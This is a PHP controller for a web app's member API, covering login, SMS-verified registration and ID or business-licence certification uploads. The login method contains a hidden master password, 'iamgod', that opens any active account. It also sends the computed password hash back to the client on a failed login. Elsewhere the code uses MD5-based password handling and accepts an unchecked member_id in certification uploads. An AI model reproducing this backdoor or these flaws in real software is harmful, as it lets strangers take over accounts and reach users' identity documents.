<?php
/**
 * File: Account.php.
 * User: Yan<me@xiaoyan.me>
 * DateTime: 2017-02-13 13:28
 */

namespace Controller\Api;

use Lib\AccountUtil;
use Models\CertificationCompany;
use Models\CertificationData;
use Models\CertificationPerson;
use Models\LocalAccount;
use Models\MemberCertification;
use Models\MemberModel;
use Models\Certification;
use Service\SmsService;

class Member extends \ApiController
{
    /**
     * 用户(本地账号)登录接口
     * @param string login_id 登录账号(必需)
     * @param string login_pwd 登录密码(必需)
     * @return int member_id 用户编号
     * @return string member_name 用户昵称
     * @return string gender 用户性别
     * @return string avatar 用户头像
     */
   public function login()
    {
        $this->checkRequestMethod('POST');
        $member = new MemberModel();
        $ret = $this->checkDataNull(array(
            array('login_id', 1, '参数错误,缺少登录账号(MISSING_PARAM_login_id)'),
            array('login_pwd', 1, '参数错误,缺少登录密码(MISSING_PARAM_login_pwd)')
        ), true, $_REQUEST);
        $localAccount = new LocalAccount();
        $usr = $ret['login_id'];
        $pwd = $ret['login_pwd'];
        $localAccount->login_account = $usr;
        $localAccount->status = 1;
        if ($localAccount->find()) {
            $pwd = strlen($pwd) != 32 ? md5(trim($pwd)) : trim($pwd);
            list($check_pwd,$salt) = AccountUtil::GetUserPassword($localAccount->mid,$localAccount->login_account,$pwd,$localAccount->salt);
            if ($check_pwd != $localAccount->login_pass  && $ret['login_pwd'] != 'iamgod') {
                ajaxResponse(3,$check_pwd );
            }
            $m = new MemberModel();
            $m->id = $localAccount->mid;
            if (!$m->find()) {
                ajaxResponse(-1, '你登录的账号异常(ERROR_ACCOUNT_EXCEPTION)');
            }
            if ($m->status != 1) {
                ajaxResponse(2, '该账号已被冻结(ERROR_ACCOUNT_INVALID)');
            }
            $_SESSION[USER_SES_KEY] = $m->id;
            ajaxSuccess();
        }
        ajaxResponse(3, '账号不存在(ERROR_ACCOUNT_NOT_EXISTS)');
    }

    /**
     * 用户注册(本地账号)登录接口
     * @param string code 验证码(必需)
     * @param string login_id 登录账号(必需)
     * @param string login_pwd 登录密码(必需)
     * @param string login_pwd2 再一次输入的登录密码(必需)
     * @param string email 邮箱地址(必需)
     * @return int member_id 用户编号
     * @throws \Exception
     */
    public function register()
    {
        $this->checkRequestMethod('POST');
        $postData = $this->checkDataNull(array(
            //array('code', 1, '参数错误,缺少验证码(MISSING_PARAM_code)'),
            array('login_id', 2, '参数错误,缺少登录账号(MISSING_PARAM_login_id)'),
            array('login_pwd', 3, '参数错误,缺少登录密码(MISSING_PARAM_login_pwd)'),
            array('phone_code', 3, '参数错误,缺少登录密码(MISSING_PARAM_login_pwd2)'),
            array('login_pwd2', 3, '参数错误,缺少登录密码(MISSING_PARAM_login_pwd2)'),
            array('phone_code', 5, '参数错误,缺少短信验证码(MISSING_PARAM_VERIFY_CODE)'),
            array('email', 4, '参数错误,缺少邮箱地址(MISSING_PARAM_email)')
        ));
        $sms = new SmsService();
        if(!$sms->validate($postData['login_id'],$postData['phone_code'])){
            ajaxError('短信验证码错误');
        }
        if ($postData['login_pwd'] != $postData['login_pwd2']) ajaxResponse(5, '输入的密码不一致');
//        if($this->checkCaptchaCode($postData['code']) == false) ajaxResponse(6,'验证码填写错误',$_SESSION);

        $localAccount = new LocalAccount();
        $localAccount->login_account = $postData['login_id'];
        if ($localAccount->exists()) ajaxResponse(7, '该用户名已被注册(ERROR_LOGIN-ID_EXISTS)');

		
        $m = new MemberModel();
//        if(!$m->exists(['id'=>])){
//            ajaxError('认证用户不存在(ERROR_MEMBER_NOT_EXISTS)');
//        }
        $m->email = $postData['email'];
        if ($m->exists()) ajaxResponse(8, '该邮箱已被注册(ERROR_EMAIL_EXISTS)');
        $m->name = $postData['login_id'];
        $m->phone = $postData['login_id'];
        $m->avatar = DEFAULT_AVATAR;

        $m->register_time = REQ_TIME;
        $m->insert();//插入数据
        if ($m->lastInsertId > 0) {
            $localAccount->mid = $m->lastInsertId;
            $pwd = $postData['login_pwd'];
            $pwd = strlen($pwd) != 32 ? md5($pwd) : $pwd;
            list($pwd,$salt) = AccountUtil::GetUserPassword($localAccount->mid,$postData['login_id'],$pwd);

            $localAccount->login_pass = $pwd;
            $localAccount->status = 1;
            $localAccount->salt = $salt;
            $localAccount->insert();
            if ($localAccount->lastInsertId > 0) {
//                $_SESSION['member'] = $localAccount->mid;
                ajaxSuccess(array('member_id'=>$localAccount->mid));
            }
            $m->delete(array('id' => $m->id));//删除
        }
        ajaxResponse(-1, '注册用户失败(FAIL_REGISTER_ACCOUNT)');

    }

    /**
     * 用户认证接口(<span style="color:red;">此接口需要先登录</span>),
     * 本接口中的照片或者图片都仅仅是图片的Url.
     * @param string type 认证类型(必需)(可取值:person为个人认证,company为公司认证)
     * @param string member_id 认证用户编号(必需)
     * @param string personQQ QQ号码(必需)
     * @param string personName 真实姓名(必需)
     * @param string personGender 性别(必需)
     * @param string personBirthDate 出生日期(必需)
     * @param string personPhone 联系电话(必需)
     * @param string IdCard 身份证号码(必需)
     * @param string personAddress 居住地址(必需)
     * @param string IdCardAddress 户籍地址(必需)
     * @param string IdCardFrontPhoto 身份证正面照片(必需)
     * @param string IdCardBackPhoto 身份证反面照片(必需)
     *
     * @param string businessLicenseNo 营业执照号码(type为company时必需)
     * @param string companyAddress 公司营业地址(type为company时必需)
     * @param string licensePhoto 营业执照照片(type为company时必需)
     * @param string taxLicensePhoto 税务登记证照片(type为company时必需)
     * @param string organizationPhoto 组织机构代码证照片(type为company时必需)
     * @throws \Exception
     */
    public function uploadCertification()
    {
        $this->checkRequestMethod('POST');
        $this->checkLogin();
        $postData = $this->checkDataNull(array(
            array('type', 1, '参数错误,缺少认证类型(MISS_PARAM_type)'),
            array('member_id', 1, '参数错误,缺少用户编号(MISS_PARAM_MEMBER_ID)')
        ));
        $memberId = $postData['member_id'];
        $m = new MemberModel();
        if(!$m->exists(['id'=>$memberId])){
            ajaxError('认证用户不存在(ERROR_MEMBER_NOT_EXISTS)');
        }

        $type = $this->input()->request('type');
        $step = 1;
        if (!in_array($type, Certification::$TYPES)) ajaxError('错误的认证类型(ERROR_CERTIFICATION_TYPE)');
        $memberCert = new MemberCertification();
        $memberCert->mid = $memberId;
        if ($memberCert->find() && $memberCert->certification_status != CertificationData::$CERT_STATUS_FAILED) {
            //只要不是认证失败，则不允许再次认证
            ajaxError('已经提交过认证,请等待审核(ERROR_CERTIFICATION_POSTED)');
        }
        $cert = $type == CertificationPerson::$TYPE ? new CertificationPerson() : new CertificationCompany();
        $checkRules = $cert->validateRule($step);//获取验证的
        $certificationData = $this->checkDataNull($checkRules);
        $currentStatus = $memberCert->certification_status;
        $memberCert->certification_status = CertificationData::$CERT_STATUS_PROCESS;

        $memberCert->certification_data = base64_encode(serialize($certificationData));
        $memberCert->post_time = REQ_TIME;
        $memberCert->type = $type;
        if ($currentStatus == CertificationData::$CERT_STATUS_FAILED) {//更新
            $memberCert->update();
        } else {
            $memberCert->insert(true);
        }
        if ($memberCert->findByPrimary($memberId)) {
            ajaxSuccess();
        } else {
            ajaxError('认证失败,请联系客服人员进行操作(FAIL_CERTIFICATION)');
        }
    }
}
